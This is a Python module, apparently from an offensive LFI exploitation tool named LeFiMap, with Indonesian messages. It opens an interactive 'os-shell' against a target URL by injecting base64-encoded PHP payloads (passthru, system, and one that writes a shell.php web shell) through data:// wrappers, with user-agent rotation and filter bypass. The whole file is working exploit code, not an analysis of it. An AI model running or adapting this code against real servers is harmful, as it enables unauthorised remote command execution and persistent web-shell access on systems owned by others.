import requests
import re
import base64
from utils.encoder import apply_filters
from utils.output_handler import write_to_output
from utils.banner import info, warning, bold
from utils.user_agents import get_random_agent

START_MARKER = "L_E_E_X_Y"
END_MARKER = "D_L_I_X"

def start_os_shell(session, url, method, post_data_template, proxies, filter_name, timeout, payloads, random_agent, custom_agent_list, custom_headers=None):
    print(f"{info()} Mencoba memulai OS Shell... Gunakan 'exit' atau 'quit' untuk keluar.\n")
    
    # session.headers.update({'User-Agent': 'LeFiMap-Shell'})
    if custom_headers:
        session.headers.update(custom_headers)
        
    local_headers = {}
    if proxies:
        session.proxies.update(proxies)

    while True:
        try:
            if random_agent:
                random_agent_string = get_random_agent(custom_list=custom_agent_list)
                local_headers['User-Agent'] = random_agent_string
            else:
                local_headers["User-Agent"] = 'LefiMap-Shell'
            user_cmd = input(bold("os-shell> "))
            if user_cmd.lower() in ["exit", "quit"]:
                break
            if not user_cmd:
                continue

            php_payload = f"<?php echo '{START_MARKER}'; passthru('{user_cmd}'); echo '{END_MARKER}'; ?>"
            php_payload_2 = f"<?php echo '{START_MARKER}'; system($_GET['cmd']); echo '{END_MARKER}'; ?>"
            php_payload_3 = f"<?php echo '{START_MARKER}'; system('{user_cmd}'); echo '{END_MARKER}'; ?>"
            php_payload_4 = f"<?php file_put_contents('shell.php', '<?php echo '{START_MARKER}'; system($_GET['cmd']); echo '{END_MARKER}'; ?>'); ?>"
            
            
            b64_php_payload = base64.b64encode(php_payload.encode()).decode()
            b64_php_payload_2 = base64.b64encode(php_payload_2.encode()).decode()
            b64_php_payload_3 = base64.b64encode(php_payload_3.encode()).decode()
            b64_php_payload_4 = base64.b64encode(php_payload_4.encode()).decode()
            
            final_payload = f"data://text/plain;base64,{b64_php_payload}"
            final_payload_2 = f"data://text/plain;base64,{b64_php_payload_2}&cmd={user_cmd}"
            final_payload_3 = f"data://text/plain;base64,{b64_php_payload_3}"
            final_payload_4 = f"data://text/plain;base64,{b64_php_payload_4}"
            # final_payload = base64.b64encode(final_payload.encode()).decode()
            
            response = None
            if method == "GET":
                # if filter_name:
                #     final_payload_2 = apply_filters(final_payload_2, filter_name)
                    
                # if payloads == 4:
                #     final = final_payload_4
                #     if filter_name:
                #         final = apply_filters(final_payload_4, filter_name)
                #     uploads = session.get(final, timeout=timeout)
                #     if uploads:
                #         cmd = "http://localhost/lab-lfi/shell.php?cmd=FUZZ"
                #         print("{info()} Shell berhasil di uploads")
                #         print(f"{info()} Payloads: {user_cmd}")
                #         shell_url = cmd.replace("FUZZ", user_cmd)
                #         response = session.get(shell_url, timeout=timeout)

                if payloads == 1:    
                    if filter_name:
                        final_payload = apply_filters(final_payload, filter_name)
                    print(f"{info()} Payload: {final_payload}")
                    shell_url = url.replace("FUZZ", final_payload)
                    response = session.get(shell_url, timeout=timeout, headers=local_headers)
                elif payloads == 2:
                    if filter_name:
                        final_payload_2 = apply_filters(final_payload_2, filter_name)
                    print(f"{info()} Payload: {final_payload_2}")
                    shell_url = url.replace("FUZZ", final_payload_2)
                    response = session.get(shell_url, timeout=timeout, headers=local_headers)
                elif payloads == 3:
                    if filter_name:
                        final_payload_3 = apply_filters(final_payload_3, filter_name)
                    print(f"{info()} Payload: {final_payload_3}")
                    shell_url = url.replace("FUZZ", final_payload_3)
                    response = session.get(shell_url, timeout=timeout, headers=local_headers)
                else:
                    print(f"{warning()} Payload {payloads} Belum tersedia di tools kami!")
                    
                # print(response.text)
            elif method == "POST":
                if payloads == 1:
                    if filter_name:
                        final_payload = apply_filters(final_payload, filter_name)
                        
                    print(f"{info()} Payload: {final_payload}")
                    shell_data_str = post_data_template.replace("FUZZ", final_payload)
                    shell_data_dict = dict(item.split('=', 1) for item in shell_data_str.split('&'))
                    response = session.post(url, data=shell_data_dict, timeout=timeout, headers=local_headers)
                elif payloads == 2:
                    if filter_name:
                        final_payload_2 = apply_filters(final_payload_2, filter_name)
                        
                    print(f"{info()} Payload: {final_payload_2}")
                    shell_data_str = post_data_template.replace("FUZZ", final_payload_2)
                    shell_data_dict = dict(item.split('=', 1) for item in shell_data_str.split('&'))
                    response = session.post(url, data=shell_data_dict, timeout=timeout, headers=local_headers)
                elif payloads == 3:
                    if filter_name:
                        final_payload_3 = apply_filters(final_payload_3, filter_name)
                        
                    print(f"{info()} Payload: {final_payload_3}")
                    shell_data_str = post_data_template.replace("FUZZ", final_payload_3)
                    shell_data_dict = dict(item.split('=', 1) for item in shell_data_str.split('&'))
                    response = session.post(url, data=shell_data_dict, timeout=timeout, headers=local_headers)
                else:
                    print(f"{warning()} Payload {payloads} Belum tersedia di tools kami!")
            
            if response:
                match = re.search(f"{START_MARKER}(.*?){END_MARKER}", response.text, re.DOTALL)
                if match:
                    output = match.group(1).strip()
                    print(output)
                    print("")
                    write_to_output(f"os-shell> {user_cmd}")
                    write_to_output("")
                    write_to_output(output)
                    write_to_output("")
                else:
                    print(f"{warning()} Gagal mengekstrak output. Target mungkin tidak dapat dieksekusi atau WAF memblokir wrapper data://.")

        except requests.RequestException as e:
            print(f"{warning()} Koneksi error: {e}")
        except KeyboardInterrupt:
            print(f"\n{info()} Shell dihentikan.")
            break